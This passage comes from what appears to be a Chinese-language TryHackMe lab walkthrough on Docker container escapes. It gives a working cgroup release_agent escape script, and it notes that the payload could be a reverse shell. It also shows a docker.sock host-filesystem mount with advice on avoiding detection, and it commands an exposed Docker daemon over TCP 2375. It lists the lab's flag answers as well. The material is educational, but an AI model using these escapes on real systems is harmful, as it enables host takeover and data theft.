<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">1</span><span class="token plain">. </span><span class="token function" style="color:#d73a49">mkdir</span><span class="token plain"> /tmp/cgrp </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">mount</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-t</span><span class="token plain"> cgroup </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> rdma cgroup /tmp/cgrp </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">mkdir</span><span class="token plain"> /tmp/cgrp/x</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2</span><span class="token plain">. </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> /tmp/cgrp/x/notify_on_release</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">3</span><span class="token plain">. </span><span class="token assign-left variable" style="color:#36acaa">host_path</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">`</span><span class="token variable function" style="color:#d73a49">sed</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable parameter variable" style="color:#36acaa">-n</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable string" style="color:#e3116c">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span><span class="token variable" style="color:#36acaa"> /etc/mtab</span><span class="token variable" style="color:#36acaa">`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">4</span><span class="token plain">. </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string variable" style="color:#36acaa">$host_path</span><span class="token string" style="color:#e3116c">/exploit&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> /tmp/cgrp/release_agent</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5</span><span class="token plain">. </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;#!/bin/sh&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> /exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">6</span><span class="token plain">. </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;cat /home/cmnatic/flag.txt &gt; </span><span class="token string variable" style="color:#36acaa">$host_path</span><span class="token string" style="color:#e3116c">/flag.txt&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> /exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">7</span><span class="token plain">. </span><span class="token function" style="color:#d73a49">chmod</span><span class="token plain"> a+x /exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">8</span><span class="token plain">. </span><span class="token function" style="color:#d73a49">sh</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;</span><br></span></code></pre></div></div>
<p>注意：我们可以在 /exploit 文件（步骤 5）中放置任何我们喜欢的内容。 例如，这可能是到我们攻击机器的反向 shell。</p>
<hr>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="漏洞解释">漏洞解释<a href="#漏洞解释" class="hash-link" aria-label="漏洞解释的直接链接" title="漏洞解释的直接链接" translate="no">​</a></h3>
<ol>
<li class="">我们需要创建一个组来使用 Linux 内核编写和执行我们的漏洞利用。 内核使用 &quot;cgroups&quot; 来管理操作系统上的进程。 由于我们可以作为主机上的 root 管理 &quot;cgroups&quot;，我们将其挂载到容器的 &quot;/tmp/cgrp&quot;。</li>
<li class="">为了让我们的漏洞利用执行，我们需要告诉内核运行我们的代码。 通过将 &quot;1&quot; 添加到 &quot;/tmp/cgrp/x/notify_on_release&quot;，我们告诉内核在 &quot;cgroup&quot; 完成后执行某些内容。 (<a href="https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt" target="_blank" rel="noopener noreferrer" class="">Paul Menage., 2004</a>)。</li>
<li class="">我们找出容器文件在主机上的存储位置并将其存储为变量。</li>
<li class="">然后我们将容器文件的位置回显到我们的 &quot;/exploit&quot; 中，最终到 &quot;release_agent&quot;，这将在 &quot;cgroup&quot; 释放时被执行。</li>
<li class="">让我们将我们的漏洞利用转换为主机上的 shell</li>
<li class="">一旦 &quot;/exploit&quot; 被执行，执行命令将主机标志回显到容器中名为 &quot;flag.txt&quot; 的文件中。</li>
<li class="">使我们的漏洞利用可执行！</li>
<li class="">我们创建一个进程并将其存储到 &quot;/tmp/cgrp/x/cgroup.procs&quot; 中。 当进程被释放时，内容将被执行。</li>
</ol>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 在此任务中对目标机器执行漏洞利用。 <strong>现在已添加到容器中的标志值是什么？</strong> </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{MOUNT_MADNESS}</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务-4-漏洞-2通过暴露的-docker-守护进程逃逸">任务 4 漏洞 2：通过暴露的 Docker 守护进程逃逸<a href="#任务-4-漏洞-2通过暴露的-docker-守护进程逃逸" class="hash-link" aria-label="任务 4 漏洞 2：通过暴露的 Docker 守护进程逃逸的直接链接" title="任务 4 漏洞 2：通过暴露的 Docker 守护进程逃逸的直接链接" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="unix-套接字-101通用">Unix 套接字 101（通用）<a href="#unix-套接字-101通用" class="hash-link" aria-label="Unix 套接字 101（通用）的直接链接" title="Unix 套接字 101（通用）的直接链接" translate="no">​</a></h3>
<p>当提到 &quot;套接字&quot; 时，您可能会想到网络中的 &quot;套接字&quot;。 嗯，这里的概念几乎相同。 套接字用于在两个位置之间移动数据。 Unix 套接字使用文件系统传输数据，而不是网络接口。 这被称为进程间通信（IPC），在操作系统中至关重要，因为能够在进程之间发送数据非常重要。</p>
<p>Unix 套接字在传输数据方面比 TCP/IP 套接字快得多 (<a href="https://www.percona.com/blog/2020/04/13/need-to-connect-to-a-local-mysql-server-use-unix-domain-socket/" target="_blank" rel="noopener noreferrer" class="">Percona., 2020</a>)。 这就是为什么像 <a href="https://redis.io/" target="_blank" rel="noopener noreferrer" class="">Redis</a> 这样的数据库技术能够提供如此出色的性能。 Unix 套接字也使用文件系统权限。 这一点在下一节中要记住。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="docker-如何使用套接字">Docker 如何使用套接字<a href="#docker-如何使用套接字" class="hash-link" aria-label="Docker 如何使用套接字的直接链接" title="Docker 如何使用套接字的直接链接" translate="no">​</a></h3>
<p>当与 Docker 引擎交互时（即运行诸如 <code>docker run</code> 之类的命令），这将使用套接字完成（通常，这是使用 Unix 套接字完成的，除非您向远程 Docker 主机执行命令）。 回想一下，Unix 套接字使用文件系统权限。 这就是为什么您必须是 Docker 组的成员（或者是 root！） 才能运行 Docker 命令，因为您需要权限来访问 Docker 拥有的套接字。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Verifying that our user is a part of the Docker group</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic@demo-container:~$ </span><span class="token function" style="color:#d73a49">groups</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">docker</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="在容器中查找-docker-套接字">在容器中查找 Docker 套接字<a href="#在容器中查找-docker-套接字" class="hash-link" aria-label="在容器中查找 Docker 套接字的直接链接" title="在容器中查找 Docker 套接字的直接链接" translate="no">​</a></h3>
<p>请记住，容器使用 Docker 引擎与主机操作系统交互（因此，可以访问 Docker 套接字！） 这个套接字（名为 docker.sock）将被挂载到容器中。 此位置因容器运行的操作系统而异，因此您需要 <code>find</code> 它。 但是，在此示例中，容器运行 Ubuntu 18.04，意味着 docker.sock 位于 <code>/var/run</code> 中。</p>
<p><strong>注意</strong>：此位置可能因操作系统而异，甚至可以在容器运行时由开发人员手动设置。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Finding the docker.sock file in a container</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic@demo-container:~$ </span><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-la</span><span class="token plain"> /var/run </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> sock</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">srw-rw---- </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> root </span><span class="token function" style="color:#d73a49">docker</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> Dec </span><span class="token number" style="color:#36acaa">9</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">19</span><span class="token plain">:37 docker.sock</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="利用容器中的-docker-套接字">利用容器中的 Docker 套接字<a href="#利用容器中的-docker-套接字" class="hash-link" aria-label="利用容器中的 Docker 套接字的直接链接" title="利用容器中的 Docker 套接字的直接链接" translate="no">​</a></h3>
<p>首先，让我们确认我们可以执行 docker 命令。 您需要在容器上是 root 用户，或者作为低权限用户拥有 &quot;docker&quot; 组权限。</p>
<p>让我们分解这里的漏洞：</p>
<hr>
<p>我们将使用 Docker 创建一个新容器，并将主机的文件系统挂载到这个新容器中。 然后我们将访问新容器并查看主机的文件系统。</p>
<p>我们的最终命令将如下所示：<code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code>，它执行以下操作：</p>
<ol>
<li class="">我们将需要上传一个 docker 镜像。 对于这个房间，我已经在 VM 上提供了这个。 它被称为 &quot;alpine&quot;。 &quot;alpine&quot; 发行版不是必需的，但它非常轻量级，并且会更好地融入环境。 为了避免检测，最好使用系统中已存在的镜像，否则，您必须自己上传。</li>
<li class="">我们将使用 <code>docker run</code> 启动新容器并将主机的文件系统 (/) 挂载到新容器中的 (/mnt)：<code>docker run -v /:/mnt</code></li>
<li class="">我们将告诉容器以交互方式运行（以便我们可以在新容器中执行命令）：<code>-it</code></li>
<li class="">现在，我们将使用已提供的 alpine 镜像：<code>alpine</code></li>
<li class="">我们将使用 <code>chroot</code> 将容器的根目录更改为 /mnt（我们在这里挂载来自主机操作系统的文件）：<code>chroot /mnt</code></li>
<li class="">现在，我们将告诉容器运行 <code>sh</code> 以获得 shell 并在容器中执行命令：<code>sh</code></li>
</ol>
<p>您可能需要 &quot;Ctrl + C&quot; 一次或两次来取消漏洞利用，但如下所示，我们已成功将主机操作系统的文件系统挂载到新的 alpine 容器中。</p>
<hr>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="验证成功">验证成功<a href="#验证成功" class="hash-link" aria-label="验证成功的直接链接" title="验证成功的直接链接" translate="no">​</a></h3>
<p>执行命令后，我们应该看到我们已被放置到一个新容器中。 请记住，我们将主机的文件系统挂载到 /mnt（然后使用 <code>chroot</code> 使容器的 /mnt 变为 /）</p>
<p>所以，让我们通过 <code>ls /</code> 查看 / 的内容</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Listing the contents of / on the new container (which will have the host operating system&#x27;s files)</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root@alpine-container:~</span><span class="token comment" style="color:#999988;font-style:italic"># ls /</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bin   dev  home  lib32  libx32      media  opt   root  sbin  srv       sys  usr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  swapfile  tmp  var</span><br></span></code></pre></div></div>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 命名容器上包含 docker.sock 文件的目录路径。 </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/var/run</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 在此任务中对目标机器执行漏洞利用。 <strong>主机操作系统上 /root/flag.txt 处的标志值是什么？</strong> </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{NEVER-ENOUGH-SOCKS}</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务-5-漏洞-3通过暴露的-docker-守护进程进行远程代码执行">任务 5 漏洞 3：通过暴露的 Docker 守护进程进行远程代码执行<a href="#任务-5-漏洞-3通过暴露的-docker-守护进程进行远程代码执行" class="hash-link" aria-label="任务 5 漏洞 3：通过暴露的 Docker 守护进程进行远程代码执行的直接链接" title="任务 5 漏洞 3：通过暴露的 Docker 守护进程进行远程代码执行的直接链接" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="docker-引擎---tcp-套接字版">Docker 引擎 - TCP 套接字版<a href="#docker-引擎---tcp-套接字版" class="hash-link" aria-label="Docker 引擎 - TCP 套接字版的直接链接" title="Docker 引擎 - TCP 套接字版的直接链接" translate="no">​</a></h3>
<p>回想一下 Docker 在先前任务中如何使用套接字在主机操作系统和容器之间通信。 Docker 也可以使用 TCP 套接字来实现这一点。</p>
<p>Docker 可以远程管理。 例如，使用管理工具如 <a href="https://www.portainer.io/" target="_blank" rel="noopener noreferrer" class="">Portainer</a> 或 <a href="https://www.jenkins.io/" target="_blank" rel="noopener noreferrer" class="">Jenkins</a> 来部署容器以测试其代码（耶，自动化！）。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="漏洞">漏洞<a href="#漏洞" class="hash-link" aria-label="漏洞的直接链接" title="漏洞的直接链接" translate="no">​</a></h3>
<p>当配置为远程运行时，Docker 引擎将监听一个端口。 Docker 引擎易于远程访问，但难以安全地实现。 这里的漏洞是 Docker 可远程访问并允许任何人执行命令。 首先，我们需要枚举。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="枚举查找设备是否具有可远程访问的-docker">枚举：查找设备是否具有可远程访问的 Docker<a href="#枚举查找设备是否具有可远程访问的-docker" class="hash-link" aria-label="枚举：查找设备是否具有可远程访问的 Docker的直接链接" title="枚举：查找设备是否具有可远程访问的 Docker的直接链接" translate="no">​</a></h3>
<p>默认情况下，引擎将在 <strong>端口 2375</strong> 上运行。 我们可以通过从您的 AttackBox 对目标 (10.80.133.1) 执行 Nmap 扫描来确认这一点。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Verifying if our target has Docker remotely accessible</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic@attack-machine:~$ nmap </span><span class="token parameter variable" style="color:#36acaa">-sV</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2375</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10.80</span><span class="token plain">.133.1 Starting Nmap </span><span class="token number" style="color:#36acaa">7.80</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> https://nmap.org </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> at </span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">-01-02 </span><span class="token number" style="color:#36acaa">21</span><span class="token plain">:27 GMT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nmap scan report </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> docker-host </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">10.80</span><span class="token plain">.133.1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host is up </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token plain">.0018s latency</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Not shown: </span><span class="token number" style="color:#36acaa">65531</span><span class="token plain"> closed ports</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PORT    STATE SERVICE VERSION</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2375</span><span class="token plain">/tcp </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">docker</span><span class="token plain"> Docker </span><span class="token number" style="color:#36acaa">20.10</span><span class="token plain">.20 </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">API </span><span class="token number" style="color:#36acaa">1.41</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>看起来它是开放的；我们将使用 <code>curl</code> 命令开始与暴露的 Docker 守护进程交互。 确认我们可以访问 Docker 守护进程：curl <code>http://MACHINE_IP:2375/version</code></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">CURLing the Docker Socket</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic@attack-machine:~$ </span><span class="token function" style="color:#d73a49">curl</span><span class="token plain"> http://10.80.133.1:2375/version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">&quot;Platform&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;Name&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Docker Engine - Community&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">&quot;Components&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token string" style="color:#e3116c">&quot;Name&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Engine&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token string" style="color:#e3116c">&quot;Version&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;20.10.20&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token string" style="color:#e3116c">&quot;Details&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;ApiVersion&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;1.41&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;Arch&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;amd64&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;BuildTime&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;2022-10-18T18:18:12.000000000+00:00&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;Experimental&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;false&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;GitCommit&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;03df974&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;GoVersion&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;go1.18.7&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;KernelVersion&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;5.15.0-1022-aws&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;MinAPIVersion&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;1.12&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;Os&quot;</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;linux&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="在我们的目标上执行-docker-命令">在我们的目标上执行 Docker 命令<a href="#在我们的目标上执行-docker-命令" class="hash-link" aria-label="在我们的目标上执行 Docker 命令的直接链接" title="在我们的目标上执行 Docker 命令的直接链接" translate="no">​</a></h3>
<p>为此，我们需要告诉我们的 Docker 版本将命令发送到我们的目标（而不是我们自己的机器）。 我们可以添加 &quot;-H&quot; 开关到我们的目标。 要测试我们是否可以运行命令，我们将列出目标上的容器：<code>docker -H tcp://10.80.133.1:2375 ps</code></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Listing the containers on our target</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic@attack-machine:~$ </span><span class="token function" style="color:#d73a49">docker</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-H</span><span class="token plain"> tcp://10.80.133.1:2375 </span><span class="token function" style="color:#d73a49">ps</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CONTAINER ID   IMAGE        COMMAND               CREATED        STATUS         PORTS                               NAMES</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">b4ec8c45414c   dockertest   </span><span class="token string" style="color:#e3116c">&quot;/usr/sbin/sshd -D&quot;</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">10</span><span class="token plain"> hours ago   Up </span><span class="token number" style="color:#36acaa">7</span><span class="token plain"> minutes   </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0:22-</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token number" style="color:#36acaa">22</span><span class="token plain">/tcp, :::22-</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token number" style="color:#36acaa">22</span><span class="token plain">/tcp   priceless_mirzakhani</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="现在怎么办">现在怎么办<a href="#现在怎么办" class="hash-link" aria-label="现在怎么办的直接链接" title="现在怎么办的直接链接" translate="no">​</a></h3>
<p>既然我们已经确认可以在目标上执行 docker 命令，我们就可以做各种各样的事情。 例如，启动容器、停止容器、删除它们，或者导出容器的内容供我们进一步分析。 值得回顾一下 <a href="https://tryhackme.com/room/introtodockerk8pdqk" target="_blank" rel="noopener noreferrer" class="">Intro to Docker</a> 中涵盖的命令。 但是，我包含了一些您可能希望探索的命令：</p>
<table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">images</td><td style="text-align:left">列出容器使用的镜像；数据也可以通过逆向工程镜像来外泄。</td></tr><tr><td style="text-align:left">exec</td><td style="text-align:left">在容器上执行命令。</td></tr><tr><td style="text-align:left">run</td><td style="text-align:left">运行一个容器。</td></tr></tbody></table>
